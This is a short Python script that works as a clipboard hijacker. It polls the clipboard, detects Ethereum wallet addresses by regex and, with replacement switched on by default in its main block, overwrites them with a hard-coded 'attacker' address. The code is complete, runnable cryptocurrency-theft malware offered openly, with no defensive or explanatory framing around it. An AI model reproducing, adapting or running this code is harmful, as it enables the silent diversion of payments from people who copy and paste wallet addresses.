import time
import re
import pyperclip
import threading

# Example: Ethereum address pattern (starts with 0x, 40 hex chars)
ETH_ADDRESS_REGEX = r'0x[a-fA-F0-9]{40}'
ATTACKER_ADDRESS = '0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF'

def clipboard_monitor(replace=False):
    last_text = ""
    while True:
        try:
            text = pyperclip.paste()
            if text != last_text:
                last_text = text
                # Check for Ethereum address
                if re.fullmatch(ETH_ADDRESS_REGEX, text.strip()):
                    print(f"[!] Detected wallet address: {text}")
                    if replace:
                        pyperclip.copy(ATTACKER_ADDRESS)
                        print(f"[!] Replaced with attacker address: {ATTACKER_ADDRESS}")
            time.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(1)

def start_clipboard_monitor(replace=False):
    t = threading.Thread(target=clipboard_monitor, args=(replace,), daemon=True)
    t.start()

if __name__ == "__main__":
    # Set replace=True to enable replacement
    start_clipboard_monitor(replace=True)
    print("Clipboard monitor started. Press Ctrl+C to exit.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Exiting.")